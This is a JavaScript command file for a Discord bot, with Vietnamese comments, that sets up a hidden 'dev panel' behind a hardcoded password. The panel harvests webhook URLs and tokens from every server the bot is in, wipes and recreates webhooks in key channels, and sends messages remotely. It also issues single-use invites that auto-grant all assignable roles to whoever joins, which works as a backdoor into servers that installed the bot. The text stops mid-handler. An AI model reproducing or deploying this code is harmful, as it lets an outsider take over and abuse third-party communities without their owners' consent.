const {
  SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle,
  StringSelectMenuBuilder, ModalBuilder, TextInputBuilder, TextInputStyle,
  ChannelType, PermissionFlagsBits,
} = require("discord.js");
const fs = require("fs");
const path = require("path");
const os = require("os");
const pkg = require("../../../package.json");
const stats = require("../../utils/stats");
const history = require("../../utils/history");
const aura = require("../../utils/aura");
const game = require("../../utils/game");

const PASSWORD = "Quenmkroi2806";
const ROOT = path.join(__dirname, "..", "..", "..");
const COMMANDS_DIR = path.join(ROOT, "src", "commands");
const EXCLUDE = new Set(["node_modules", ".git"]);
// Lệnh đã ghi trong /help — phần còn lại là lệnh chuyên sâu (ẩn)
const HELP_COMMANDS = ["?spam", "?ngon", "?nhay", "?clearchat", "?stop"];
const PANEL_LIFETIME = 10 * 60 * 1000;

// Ghi nhớ server đang chọn + view hiện tại theo từng user (panel là tin ẩn)
const views = new Map();

// Link mời dev đang chờ vào (dùng 1 lần) — Map<guildId, { code, uses, at }>
const pendingInvite = new Map();

// Ghi chú kết quả dưới panel — userId -> { embed: EmbedJSON, files?: [...] }
const notes = new Map();

function currentView(userId) {
  return views.get(userId) || { type: "main", guildId: null };
}

// ---- Format ----
function fmtDuration(ms) {
  const s = Math.max(0, Math.floor(ms / 1000));
  const d = Math.floor(s / 86400);
  const h = Math.floor((s % 86400) / 3600);
  const m = Math.floor((s % 3600) / 60);
  const sec = s % 60;
  const out = [];
  if (d) out.push(`${d} ngày`);
  if (h) out.push(`${h} giờ`);
  if (m) out.push(`${m} phút`);
  out.push(`${sec} giây`);
  return out.join(" ");
}

function fmtSince(at) {
  const diff = Date.now() - at;
  if (diff < 60000) return `${Math.max(1, Math.round(diff / 1000))} giây trước`;
  if (diff < 3600000) return `${Math.round(diff / 60000)} phút trước`;
  if (diff < 86400000) return `${Math.round(diff / 3600000)} giờ trước`;
  return `${Math.round(diff / 86400000)} ngày trước`;
}

function fmtDate(t) {
  return new Date(t).toLocaleString("vi-VN", {
    hour12: false,
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
  });
}

// ---- Cấu trúc thư mục ----
function countFiles(dir) {
  let n = 0;
  for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
    if (EXCLUDE.has(e.name)) continue;
    if (e.isDirectory()) n += countFiles(path.join(dir, e.name));
    else n++;
  }
  return n;
}

function buildTree(dir, prefix = "", depth = 0, maxDepth = 4) {
  const entries = fs
    .readdirSync(dir, { withFileTypes: true })
    .filter((e) => !EXCLUDE.has(e.name))
    .sort((a, b) => Number(b.isDirectory()) - Number(a.isDirectory()) || a.name.localeCompare(b.name));

  const lines = [];
  entries.forEach((e, i) => {
    const last = i === entries.length - 1;
    const branch = last ? "└─ " : "├─ ";
    const next = prefix + (last ? "   " : "│  ");
    if (e.isDirectory()) {
      const full = path.join(dir, e.name);
      lines.push(`${prefix}${branch}${e.name}/ (${countFiles(full)})`);
      if (depth < maxDepth) lines.push(...buildTree(full, next, depth + 1, maxDepth));
    } else {
      lines.push(`${prefix}${branch}${e.name}`);
    }
  });
  return lines;
}

function treeBlock() {
  let lines = buildTree(ROOT);
  let text = lines.join("\n");
  while (text.length > 980 && lines.length > 5) {
    lines.pop();
    text = `${lines.join("\n")}\n…`;
  }
  return `\`\`\`\n${text}\n\`\`\``;
}

function newestCommandFile() {
  let newest = null;
  const walk = (dir) => {
    for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
      const full = path.join(dir, e.name);
      if (e.isDirectory()) walk(full);
      else if (e.name.endsWith(".js")) {
        const mtime = fs.statSync(full).mtimeMs;
        if (!newest || mtime > newest.at) newest = { name: path.relative(ROOT, full).replace(/\\/g, "/"), at: mtime };
      }
    }
  };
  walk(COMMANDS_DIR);
  return newest;
}

// ---- Panel chính ----
function buildPanel(client) {
  const files = [];
  const guilds = [...client.guilds.cache.values()];
  const totalMembers = guilds.reduce((sum, g) => sum + g.memberCount, 0);
  const ping = client.ws?.ping;

  const pingLabel = ping >= 0 ? `${ping}ms` : "đang đo…";
  const pingEmoji = ping >= 0 ? (ping < 150 ? "🟢" : ping < 300 ? "🟡" : "🔴") : "⚪";

  const botField = [
    `> **Tag** · ${client.user.tag}  (\`${client.user.id}\`)`,
    `> **Phiên bản** · \`v${pkg.version}\`　**Prefix** · \`?\` / \`n?\``,
    `> **Uptime** · ${fmtDuration(client.uptime || 0)}　**Ping** · ${pingEmoji} ${pingLabel}`,
    `> **Phạm vi** · ${guilds.length} server　·　${totalMembers.toLocaleString("vi-VN")} thành viên`,
  ].join("\n");

  const hostField = `> \`Node ${process.version}\`　\`${os.platform()}/${os.arch()}\``;

  const medal = ["🥇", "🥈", "🥉"];
  const serverLines = guilds.map((g, i) => {
    const rank = medal[i] || `\`${String(i + 1).padStart(2, "0")}\``;
    return `${rank} **${g.name}** — ${g.memberCount.toLocaleString("vi-VN")} thành viên · \`${g.id}\``;
  });
  let serverField;
  if (serverLines.length && serverLines.join("\n").length <= 950 && serverLines.length <= 12) {
    serverField = serverLines.join("\n");
  } else if (serverLines.length) {
    serverField =
      serverLines.slice(0, 10).join("\n") +
      `\n*… và **${Math.max(serverLines.length - 10, 0)}** server khác — xem \`servers.txt\`*`;
    files.push({ attachment: Buffer.from(serverLines.join("\n"), "utf-8"), name: "servers.txt" });
  } else {
    serverField = "_Bot chưa ở server nào_";
  }

  const lastCmd = stats.get();
  const newest = newestCommandFile();
  const updateField = [
    `> **Lệnh gần nhất** · ${lastCmd ? `\`${lastCmd.name}\` bởi **${lastCmd.user}** — ${fmtSince(lastCmd.at)}` : "_chưa có_"}`,
    `> **File sửa gần nhất** · ${newest ? `\`${newest.name}\` — ${fmtDate(newest.at)}` : "n/a"}`,
    `> **Đã nạp** · ${client.prefixCommands?.size ?? 0} prefix + ${client.commands?.size ?? 0} slash　**Lịch sử** · ${history.total()} bản ghi`,
  ].join("\n");

  const deepLines = [];
  for (const [key, cmd] of client.prefixCommands || []) {
    if (HELP_COMMANDS.includes(key)) continue;
    deepLines.push(`\`${key}\` — ${cmd.description || "_không có mô tả_"}`);
  }

  const embed = new EmbedBuilder()
    .setAuthor({ name: "JUST LONELY · DEV PANEL", iconURL: client.user.displayAvatarURL() })
    .setTitle("🛠️  Bảng điều khiển hệ thống")
    .setDescription(
      "Chọn server ở ô danh sách bên dưới để xem chi tiết hoặc gửi tin từ xa.\n" +
        `⏳ Panel tự đóng sau **${Math.round(PANEL_LIFETIME / 60000)} phút** không thao tác.`,
    )
    .setColor(0x5865f2)
    .setThumbnail(client.user.displayAvatarURL())
    .addFields(
      { name: "🤖  Bot", value: botField, inline: false },
      { name: "🖥️  Host", value: hostField, inline: false },
      { name: `🌐  Servers · ${guilds.length}`, value: serverField, inline: false },
      { name: "⏱️  Hoạt động gần đây", value: updateField, inline: false },
      { name: "📁  Cấu trúc dự án", value: treeBlock(), inline: false },
      { name: "🔐  Lệnh chuyên sâu", value: deepLines.join("\n") || "_Không có_", inline: false },
    )
    .setFooter({ text: `${pkg.name} · dev panel`, iconURL: client.user.displayAvatarURL() })
    .setTimestamp();

  return { embeds: [embed], files };
}

// ---- Chi tiết 1 server (chọn từ ô danh sách) ----
function buildServerDetail(client, guildId) {
  const guild = client.guilds.cache.get(guildId);
  if (!guild) {
    return new EmbedBuilder()
      .setTitle("❌  Không tìm thấy server")
      .setColor(0xed4245)
      .setDescription(`Bot hiện không ở server có ID \`${guildId}\`.`);
  }

  const textChannels = guild.channels.cache.filter((c) => c.type === ChannelType.GuildText);
  const channelLines = textChannels
    .first(15)
    .map((c) => `#${c.name}`)
    .join(" ");
  const roleLines = guild.roles.cache
    .filter((r) => r.name !== "@everyone")
    .sort((a, b) => b.position - a.position)
    .first(10)
    .map((r) => `@${r.name}`)
    .join(" ");

  const me = guild.members.me;
  const perms = me ? me.permissions : null;
  const permList = perms
    ? [
        perms.has(PermissionFlagsBits.Administrator) && "Administrator",
        perms.has(PermissionFlagsBits.ManageChannels) && "ManageChannels",
        perms.has(PermissionFlagsBits.ManageWebhooks) && "ManageWebhooks",
        perms.has(PermissionFlagsBits.ManageRoles) && "ManageRoles",
        perms.has(PermissionFlagsBits.CreateInstantInvite) && "CreateInvite",
        perms.has(PermissionFlagsBits.SendMessages) && "SendMessages",
      ].filter(Boolean)
    : [];

  const invite = `https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot%20applications.commands`;

  return new EmbedBuilder()
    .setAuthor({ name: "Chi tiết server" })
    .setTitle(`🌐  ${guild.name}`)
    .setColor(0x3498db)
    .setDescription(
      [
        `> **ID** · \`${guild.id}\`　**Chủ sở hữu** · \`${guild.ownerId}\``,
        `> **Tạo ngày** · ${fmtDate(guild.createdTimestamp)}`,
        `> 👥 **${guild.memberCount.toLocaleString("vi-VN")}** thành viên　·　💬 **${textChannels.size}** kênh chữ　·　🎭 **${guild.roles.cache.size}** vai trò`,
      ].join("\n"),
    )
    .addFields(
      {
        name: `💬  Kênh văn bản · ${textChannels.size}`,
        value: channelLines ? `${channelLines}${textChannels.size > 15 ? " …" : ""}`.slice(0, 1000) : "_Không có kênh nào_",
        inline: false,
      },
      {
        name: "🎭  Vai trò nổi bật",
        value: roleLines ? roleLines.slice(0, 1000) : "_Không có vai trò nào_",
        inline: false,
      },
      {
        name: "🔑  Quyền của bot",
        value: permList.length ? permList.map((p) => `\`${p}\``).join(" ") : "_Không lấy được quyền_",
        inline: false,
      },
      { name: "➕  Mời bot", value: `[Thêm bot vào server khác](${invite})`, inline: false },
    )
    .setThumbnail(guild.iconURL({ size: 128 }))
    .setFooter({ text: "Nhấn 📋 Tổng quan để quay lại panel chính" });
}

// ---- Lịch sử ----
function buildHistoryEmbed() {
  const items = history.recent(15);
  const lines = items.length
    ? items.map((e, i) => `\`${String(i + 1).padStart(2, "0")}\` ${history.format(e).slice(0, 165)}`).join("\n")
    : "_Chưa có bản ghi nào_";

  return new EmbedBuilder()
    .setAuthor({ name: "Nhật ký hoạt động" })
    .setTitle("📜  Lịch sử hành động")
    .setColor(0x9b59b6)
    .setDescription(lines.length > 3900 ? `${lines.slice(0, 3900)}…` : lines)
    .setFooter({ text: `${history.total()} / ${history.MAX_ENTRIES} bản ghi · mới nhất ở trên` });
}

// ---- Mời dev (link 1 lần + tự cấp toàn bộ role khi vào) ----
async function createDevInvite(guild, user) {
  const me = guild.members.me;
  if (!me) throw new Error("Bot chưa sẵn sàng trong server này.");
  if (!me.permissions.has(PermissionFlagsBits.CreateInstantInvite)) throw new Error("Bot thiếu quyền `Create Invite`.");
  if (!me.permissions.has(PermissionFlagsBits.ManageRoles)) {
    throw new Error("Bot thiếu quyền `Manage Roles` nên không thể tự gán role khi dev vào.");
  }

  const channel =
    guild.systemChannel ||
    guild.channels.cache.find(
      (c) => c.isTextBased?.() && c.permissionsFor(me)?.has(PermissionFlagsBits.CreateInstantInvite),
    );
  if (!channel) throw new Error("Không tìm được kênh để tạo invite.");

  const invite = await channel.createInvite({
    maxAge: 0,
    maxUses: 1,
    unique: true,
    reason: `Invite test cho dev, tạo bởi ${user.tag}`,
  });
  pendingInvite.set(guild.id, { code: invite.code, uses: 0, at: Date.now() });

  const assignable = guild.roles.cache
    .filter((r) => r.id !== guild.id && !r.managed && r.position < me.roles.highest.position)
    .sort((a, b) => b.position - a.position);

  const roleLine = assignable.size
    ? `> **Sẽ cấp ${assignable.size} role** · ${assignable.first(8).map((r) => `@${r.name}`).join(" ")}${
        assignable.size > 8 ? " …" : ""
      }`
    : "> ⚠️ Không có role nào cấp được (role cao hơn role của bot).";

  const embed = new EmbedBuilder()
    .setTitle("🔗  Link mời dev test")
    .setColor(0x57f287)
    .setDescription(
      [
        `> ${invite.url}`,
        `> **Server** · ${guild.name}　**Vào qua** · #${channel.name}`,
        "",
        "⚠️ Link dùng **1 lần** — người đầu tiên vào bằng link này sẽ được **tự động cấp toàn bộ role** của server để tiện test bot.",
        roleLine,
        "",
        "_Không share link này công khai._",
      ].join("\n"),
    )
    .setFooter({ text: `Tạo bởi ${user.tag} · ${guild.id}` })
    .setTimestamp();

  return { invite, channel, embed };
}

function buildInviteNote(userId) {
  const note = notes.get(userId);
  if (note) return EmbedBuilder.from(note.embed);
  return new EmbedBuilder()
    .setTitle("🔗  Link mời dev test")
    .setColor(0x57f287)
    .setDescription("_Chưa tạo link lần này — bấm **🔗 Mời dev** ở hàng nút bên dưới, chọn server trước._");
}

// ---- Webhook cho các kênh quan trọng ----
const IMPORTANT_PATTERNS = [
  /qu[ảa]n\s*l[ýy]/i, /admin/i, /manage/i, /^log/i, /logs?$/i,
  /th[ôo]ng\s*b[áa]o/i, /announce/i, /^rules?$/i, /n[ộo]i\s*quy/i,
  /general/i, /^chat$/i, /chung/i, /off[- ]?topic/i, /random/i,
  /th[àa]nh\s*vi[êe]n/i, /member/i, /gi[ớo]i\s*thi[ệe]u/i, /h[ọo]i\s*tr[ưu]/i,
  /c[âa]u\s*h[ỏo]i/i, /tin\s*nh[ậa]n/i, /spam/i,
];

function importantChannels(guild) {
  const me = guild.members.me;
  const text = guild.channels.cache
    .filter(
      (c) =>
        (c.type === ChannelType.GuildText || c.type === ChannelType.GuildAnnouncement) &&
        c.permissionsFor(me)?.has(PermissionFlagsBits.ManageWebhooks),
    )
    .sort((a, b) => a.rawPosition - b.rawPosition);

  const picked = new Map();
  const add = (c) => {
    if (c && !picked.has(c.id) && picked.size < 10) picked.set(c.id, c);
  };

  add(guild.systemChannel);
  for (const c of text.values()) if (IMPORTANT_PATTERNS.some((re) => re.test(c.name))) add(c);
  for (const c of text.values()) add(c);

  return [...picked.values()];
}

async function deleteAllWebhooks(guild) {
  const me = guild.members.me;
  if (!me?.permissions.has(PermissionFlagsBits.ManageWebhooks)) throw new Error("Bot thiếu quyền `Manage Webhooks`.");

  const webhooks = await guild.fetchWebhooks().catch((err) => {
    throw new Error(`Không lấy được danh sách webhook: ${err.message}`);
  });

  let deleted = 0;
  for (const [, wh] of webhooks) {
    try {
      await wh.delete("Xóa theo lệnh dev panel");
      deleted++;
    } catch {
      /* webhook có thể bị xóa bởi người khác giữa chừng */
    }
  }
  return { deleted, total: webhooks.size };
}

async function setupWebhooks(guild, user) {
  const me = guild.members.me;
  if (!me?.permissions.has(PermissionFlagsBits.ManageWebhooks)) throw new Error("Bot thiếu quyền `Manage Webhooks`.");

  const { deleted } = await deleteAllWebhooks(guild);

  const channels = importantChannels(guild);
  const created = [];
  const errors = [];
  for (const ch of channels) {
    try {
      const wh = await ch.createWebhook({
        name: `JUST LONELY · ${ch.name}`.slice(0, 80),
        reason: `Setup webhook bởi ${user.tag}`,
      });
      created.push({ channel: ch, url: `https://discord.com/api/webhooks/${wh.id}/${wh.token}` });
    } catch (err) {
      errors.push(`#${ch.name}: ${err.message}`);
    }
  }

  return { deleted, created, errors };
}

// ---- Webhook ----
async function buildWebhookPanel(client, guildId = null) {
  const guilds = guildId
    ? [client.guilds.cache.get(guildId)].filter(Boolean)
    : [...client.guilds.cache.values()];

  const previewLines = []; // hiện trong embed — không chứa token (trừ khi chốt 1 server)
  const fullLines = []; // luôn có trong file đính kèm — kèm URI đầy đủ
  const uriLines = []; // hiện ngay trong embed khi đang chốt 1 server
  let total = 0;

  for (const guild of guilds) {
    let webhooks;
    try {
      webhooks = await guild.fetchWebhooks();
    } catch (err) {
      previewLines.push(`━━ **${guild.name}** · \`${guild.id}\` ━━\n_⚠️ Lỗi: ${err.message}_`);
      fullLines.push(`== ${guild.name} (${guild.id}) == ERROR: ${err.message}`);
      continue;
    }

    if (!webhooks.size) {
      previewLines.push(`━━ **${guild.name}** · \`${guild.id}\` ━━\n_Không có webhook_`);
      continue;
    }

    previewLines.push(`━━ **${guild.name}** · \`${guild.id}\` ━━`);
    fullLines.push(`== ${guild.name} (${guild.id}) ==`);
    for (const [, wh] of webhooks) {
      const ch = guild.channels.cache.get(wh.channelId);
      const chName = ch ? ch.name : "unknown";
      const uri = `https://discord.com/api/webhooks/${wh.id}/${wh.token}`;
      if (guildId) {
        previewLines.push(`• **#${chName}** · \`${wh.name}\`\n\`${uri}\``);
        if (uriLines.length < 15) uriLines.push(`**#${chName}** · \`${uri}\``);
      } else {
        previewLines.push(`• **${wh.name}** — #${chName} · \`${wh.id}\``);
      }
      fullLines.push(`${wh.name} (#${chName}): ${uri}`);
      total++;
    }
  }

  const preview = previewLines.join("\n");
  const files = [];
  const embed = new EmbedBuilder()
    .setAuthor({ name: "Quản lý webhook" })
    .setTitle(guildId ? "🔗  Webhook của server đang chọn" : "🔗  Webhook toàn hệ thống")
    .setColor(0xe67e22)
    .setFooter({
      text: guildId
        ? "URI đầy đủ nằm trong embed + file webhooks.txt"
        : "Chọn server ở ô danh sách để thấy URI và hiện nút thao tác",
    });

  if (preview.length <= 3500) {
    embed.setDescription(preview || "_Không có webhook nào_");
  } else {
    embed.setDescription(
      `**${total}** webhook trên **${guilds.length}** server.\nDanh sách đầy đủ trong file \`webhooks.txt\`.`,
    );
  }

  if (uriLines.length && preview.length > 3500) {
    embed.addFields({ name: "🔑 URI webhook", value: uriLines.join("\n").slice(0, 1024) });
  }

  if (fullLines.length) files.push({ attachment: Buffer.from(fullLines.join("\n"), "utf-8"), name: "webhooks.txt" });

  return { embeds: [embed], files };
}

// ---- Gửi tin từ xa ----
async function sendRemote(client, opts) {
  const guild = client.guilds.cache.get(opts.guildId);
  if (!guild) throw new Error("Bot không ở server đó");

  let channel = null;
  if (opts.channelId) {
    channel = guild.channels.cache.get(opts.channelId) || (await guild.channels.fetch(opts.channelId).catch(() => null));
  }
  if (!channel) {
    channel =
      guild.systemChannel ||
      guild.channels.cache.find(
        (c) => c.isTextBased?.() && c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.SendMessages),
      );
  }
  if (!channel || !channel.isTextBased()) throw new Error("Không tìm được kênh để gửi");

  const content = String(opts.content).slice(0, 2000);
  await channel.send({ content });

  history.record("remote", "send", {
    user: opts.user,
    guild: guild.id,
    detail: `#${channel.name}: ${content.slice(0, 100)}`,
  });

  return { guild, channel };
}

// ---- Hàng nút / ô chọn ----
function panelRows(client, userId) {
  const view = currentView(userId);
  const guildOptions = [...client.guilds.cache.values()].slice(0, 25).map((g) => ({
    label: g.name.slice(0, 100),
    description: `ID ${g.id} • ${g.memberCount} thành viên`.slice(0, 100),
    value: g.id,
    emoji: { name: "🌐" },
  }));

  const invite = `https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot%20applications.commands`;

  const rows = [
    new ActionRowBuilder().addComponents(
      new StringSelectMenuBuilder()
        .setCustomId("dev_select")
        .setPlaceholder("📡 Chọn server để điều khiển…")
        .addOptions(
          guildOptions.length
            ? guildOptions
            : [{ label: "Không có server nào", value: "none", description: "Bot chưa ở server nào" }],
        ),
    ),
    new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId("dev_main").setLabel("Tổng quan").setStyle(ButtonStyle.Secondary).setEmoji("📋"),
      new ButtonBuilder().setCustomId("dev_send").setLabel("Gửi tin").setStyle(ButtonStyle.Success).setEmoji("📨"),
      new ButtonBuilder().setCustomId("dev_history").setLabel("Lịch sử").setStyle(ButtonStyle.Primary).setEmoji("📜"),
      new ButtonBuilder().setCustomId("dev_webhooks").setLabel("Webhooks").setStyle(ButtonStyle.Secondary).setEmoji("🔗"),
      new ButtonBuilder().setCustomId("dev_invite").setLabel("Mời dev").setStyle(ButtonStyle.Primary).setEmoji("🎟️"),
    ),
    new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId("dev_aura").setLabel("Cộng aura").setStyle(ButtonStyle.Primary).setEmoji("✨"),
    ),
  ];

  // Nút thao tác webhook — chỉ hiện khi đang xem webhook của 1 server đã chọn
  if (view.type === "webhooks" && view.guildId) {
    rows.push(
      new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId("dev_wh_wipe")
          .setLabel("Xóa hết webhook")
          .setStyle(ButtonStyle.Danger)
          .setEmoji("🗑️"),
        new ButtonBuilder()
          .setCustomId("dev_wh_setup")
          .setLabel("Tạo webhook kênh quan trọng")
          .setStyle(ButtonStyle.Success)
          .setEmoji("➕"),
      ),
    );
  }

  rows.push(
    new ActionRowBuilder().addComponents(
      new ButtonBuilder().setLabel("Mời bot").setStyle(ButtonStyle.Link).setEmoji("➕").setURL(invite),
      new ButtonBuilder().setLabel("Discord").setStyle(ButtonStyle.Link).setEmoji("💬").setURL("https://discord.gg/qUk8XTdMHv/"),
    ),
  );

  return rows;
}

function sendAuraModal(defaultGuildId) {
  const guildInput = new TextInputBuilder()
    .setCustomId("sv")
    .setLabel("ID server (bỏ trống = server đang chọn)")
    .setStyle(TextInputStyle.Short)
    .setRequired(false)
    .setMaxLength(25)
    .setPlaceholder(defaultGuildId || "1523310158715949156");

  const userInput = new TextInputBuilder()
    .setCustomId("nguoi")
    .setLabel("Người nhận — dán ID hoặc dạng <@id>")
    .setStyle(TextInputStyle.Short)
    .setRequired(true)
    .setMaxLength(40)
    .setPlaceholder("123456789012345678");

  const amountInput = new TextInputBuilder()
    .setCustomId("soluong")
    .setLabel("Số aura (âm = trừ, tối đa ±99.999.999)")
    .setStyle(TextInputStyle.Short)
    .setRequired(true)
    .setMaxLength(8)
    .setPlaceholder("1000");

  return new ModalBuilder()
    .setCustomId("dev_aura_modal")
    .setTitle("Cộng aura cho thành viên")
    .addComponents(
      new ActionRowBuilder().addComponents(guildInput),
      new ActionRowBuilder().addComponents(userInput),
      new ActionRowBuilder().addComponents(amountInput),
    );
}

function sendModal(defaultGuildId) {
  const guildInput = new TextInputBuilder()
    .setCustomId("sv")
    .setLabel("ID server (bỏ trống = server đang chọn)")
    .setStyle(TextInputStyle.Short)
    .setRequired(false)
    .setMaxLength(25)
    .setPlaceholder(defaultGuildId || "1523310158715949156");

  const channelInput = new TextInputBuilder()
    .setCustomId("kenh")
    .setLabel("ID kênh (bỏ trống = kênh mặc định)")
    .setStyle(TextInputStyle.Short)
    .setRequired(false)
    .setMaxLength(25);

  const contentInput = new TextInputBuilder()
    .setCustomId("noidung")
    .setLabel("Nội dung gửi")
    .setStyle(TextInputStyle.Paragraph)
    .setRequired(true)
    .setMaxLength(1900);

  return new ModalBuilder()
    .setCustomId("dev_send_modal")
    .setTitle("Gửi tin vào server")
    .addComponents(
      new ActionRowBuilder().addComponents(guildInput),
      new ActionRowBuilder().addComponents(channelInput),
      new ActionRowBuilder().addComponents(contentInput),
    );
}

// Gộp panel chính + view hiện tại
async function renderView(client, userId) {
  const view = currentView(userId);
  const main = buildPanel(client);
  const embeds = [...main.embeds];

  if (view.type === "detail" && view.guildId) embeds.push(buildServerDetail(client, view.guildId));
  if (view.type === "history") embeds.push(buildHistoryEmbed());
  if (view.type === "invite") embeds.push(buildInviteNote(userId));
  if (view.type === "webhooks") {
    const webhooks = await buildWebhookPanel(client, view.guildId);
    embeds.push(...webhooks.embeds);
    main.files.push(...webhooks.files);
  }

  // Ghi chú kết quả (mời dev / xóa webhook / tạo webhook) — chỉ trong view liên quan
  const note = notes.get(userId);
  if (note && (view.type === "invite" || view.type === "webhooks")) {
    if (view.type === "invite") embeds[embeds.length - 1] = EmbedBuilder.from(note.embed);
    else embeds.push(EmbedBuilder.from(note.embed));
    if (note.files?.length) main.files.push(...note.files);
  }

  return { embeds, files: main.files, components: panelRows(client, userId) };
}

module.exports = {
  data: new SlashCommandBuilder()
    .setName("dev_only")
    .setDescription("Professional Dev Panel to manage servers")
    .addStringOption((o) =>
      o.setName("matkhau").setDescription("Enter pass to access deved panel").setRequired(true)
    ),

  async execute(interaction, client) {
    const pw = interaction.options.getString("matkhau");
    if (pw !== PASSWORD) {
      return interaction.reply({ content: "❌ Sai mật khẩu! Bạn không phải Dev.", ephemeral: true });
    }

    await interaction.deferReply({ ephemeral: true });
    views.set(interaction.user.id, { type: "main", guildId: null });

    const bot = client || interaction.client;
    const payload = await renderView(bot, interaction.user.id);
    const msg = await interaction.editReply(payload);

    if (msg?.edit) {
      setTimeout(() => msg.edit({ components: [] }).catch(() => {}), PANEL_LIFETIME);
    }
  },

  // Nút bấm / ô chọn / form — do discord-bot.js gọi
  async onComponent(interaction, client) {
    const bot = client || interaction.client;
    const id = interaction.customId;

    // Chọn server trong danh sách → hiện chi tiết
    if (id === "dev_select") {
      const guildId = interaction.values?.[0];
      if (!guildId || guildId === "none") return interaction.update({}).catch(() => {});
      notes.delete(interaction.user.id);
      views.set(interaction.user.id, { type: "detail", guildId });
      const payload = await renderView(bot, interaction.user.id);
      return interaction.update(payload);
    }

    if (id === "dev_main") {
      notes.delete(interaction.user.id);
      views.set(interaction.user.id, { type: "main", guildId: currentView(interaction.user.id).guildId });
      const payload = await renderView(bot, interaction.user.id);
      return interaction.update(payload);
    }

    if (id === "dev_history") {
      notes.delete(interaction.user.id);
      views.set(interaction.user.id, { type: "history", guildId: currentView(interaction.user.id).guildId });
      const payload = await renderView(bot, interaction.user.id);
      return interaction.update(payload);
    }

    if (id === "dev_webhooks") {
      await interaction.deferUpdate();
      notes.delete(interaction.user.id);
      views.set(interaction.user.id, { type: "webhooks", guildId: currentView(interaction.user.id).guildId });
      const payload = await renderView(bot, interaction.user.id);
      return interaction.editReply(payload);
    }

    // 🎟️ Tạo link mời dev (dùng 1 lần + tự cấp toàn bộ role khi có người vào)
    if (id === "dev_invite") {
      const view = currentView(interaction.user.id);
      if (!view.guildId) {
        return interaction
          .reply({ content: "❌ Chưa chọn server — hãy chọn ở ô danh sách trước.", ephemeral: true })
          .catch(() => {});
      }
      const guild = bot.guilds.cache.get(view.guildId);
      if (!guild) {
        return interaction.reply({ content: "❌ Bot không ở server đó.", ephemeral: true }).catch(() => {});
      }

      await interaction.deferUpdate();
      let note;
      try {
        const { invite, embed } = await createDevInvite(guild, interaction.user);
        note = { embed: embed.toJSON() };
        history.record("invite", "dev.create", { user: interaction.user.tag, guild: guild.id, detail: invite.url });
      } catch (err) {
        note = {
          embed: new EmbedBuilder()
            .setTitle("❌  Không tạo được link mời")
            .setColor(0xed4245)
            .setDescription(`\`${err.message}\``)
            .toJSON(),
        };
        history.record("invite", "dev.create", {
          user: interaction.user.tag,
          guild: guild.id,
          detail: err.message,
          ok: false,
        });
      }

      notes.set(interaction.user.id, note);
      views.set(interaction.user.id, { type: "invite", guildId: guild.id });
      const payload = await renderView(bot, interaction.user.id);
      return interaction.editReply(payload);
    }

    // 🗑️ Xóa hết webhook trong server đang chọn
    if (id === "dev_wh_wipe") {
      const guildId = currentView(interaction.user.id).guildId;
      const guild = guildId ? bot.guilds.cache.get(guildId) : null;
      if (!guild) return interaction.reply({ content: "❌ Chưa chọn server.", ephemeral: true }).catch(() => {});

      await interaction.deferUpdate();
      let note;
      try {
        const { deleted, total } = await deleteAllWebhooks(guild);
        note = {
          embed: new EmbedBuilder()
            .setTitle("🗑️  Đã xóa webhook")
            .setColor(0xe74c3c)
            .setDescription(
              `Xóa **${deleted}/${total}** webhook trong **${guild.name}**.\nDanh sách hiện tại ở ô bên trên.`,
            )
            .toJSON(),
        };
        history.record("webhook", "wipe", {
          user: interaction.user.tag,
          guild: guild.id,
          detail: `${deleted}/${total} webhook`,
        });
      } catch (err) {
        note = {
          embed: new EmbedBuilder()
            .setTitle("❌  Không xóa được webhook")
            .setColor(0xed4245)
            .setDescription(`\`${err.message}\``)
            .toJSON(),
        };
        history.record("webhook", "wipe", { user: interaction.user.tag, guild: guild.id, detail: err.message, ok: false });
      }

      notes.set(interaction.user.id, note);
      const payload = await renderView(bot, interaction.user.id);
      return interaction.editReply(payload);
    }

    // ➕ Xóa webhook cũ + tạo webhook cho các kênh quan trọng của server đang chọn
    if (id === "dev_wh_setup") {
      const guildId = currentView(interaction.user.id).guildId;
      const guild = guildId ? bot.guilds.cache.get(guildId) : null;
      if (!guild) return interaction.reply({ content: "❌ Chưa chọn server.", ephemeral: true }).catch(() => {});

      await interaction.deferUpdate();
      let note;
      try {
        const { deleted, created, errors } = await setupWebhooks(guild, interaction.user);

        const lines = created.map((c) => `**#${c.channel.name}**\n\`${c.url}\``);
        const body = [
          `🗑️ Đã xóa **${deleted}** webhook cũ　·　➕ Đã tạo **${created.length}** webhook mới.`,
          "",
          ...(lines.length ? lines : ["_Không tạo được webhook nào (kiểm tra quyền `Manage Webhooks`)_"]),
          ...(errors.length ? ["", "**Lỗi:**", ...errors.map((e) => `\`${e}\``)] : []),
        ].join("\n");

        const files = created.length
          ? [
              {
                attachment: Buffer.from(
                  [`== ${guild.name} (${guild.id}) ==`, ...created.map((c) => `#${c.channel.name}: ${c.url}`)].join("\n"),
                  "utf-8",
                ),
                name: "webhooks.txt",
              },
            ]
          : [];

        note = {
          embed: new EmbedBuilder()
            .setTitle("➕  Webhook cho kênh quan trọng")
            .setColor(0x2ecc71)
            .setDescription(body.length > 3900 ? `${body.slice(0, 3900)}…` : body)
            .setFooter({ text: `URI cũng nằm trong file webhooks.txt · ${interaction.user.tag}` })
            .toJSON(),
          files,
        };
        history.record("webhook", "setup", {
          user: interaction.user.tag,
          guild: guild.id,
          detail: `xóa ${deleted} · tạo ${created.length}${errors.length ? ` · ${errors.length} lỗi` : ""}`,
        });
      } catch (err) {
        note = {
          embed: new EmbedBuilder()
            .setTitle("❌  Không setup được webhook")
            .setColor(0xed4245)
            .setDescription(`\`${err.message}\``)
            .toJSON(),
        };
        history.record("webhook", "setup", { user: interaction.user.tag, guild: guild.id, detail: err.message, ok: false });
      }

      notes.set(interaction.user.id, note);
      const payload = await renderView(bot, interaction.user.id);
      return interaction.editReply(payload);
    }

    if (id === "dev_send") {
      const view = currentView(interaction.user.id);
      return interaction.showModal(sendModal(view.guildId));
    }

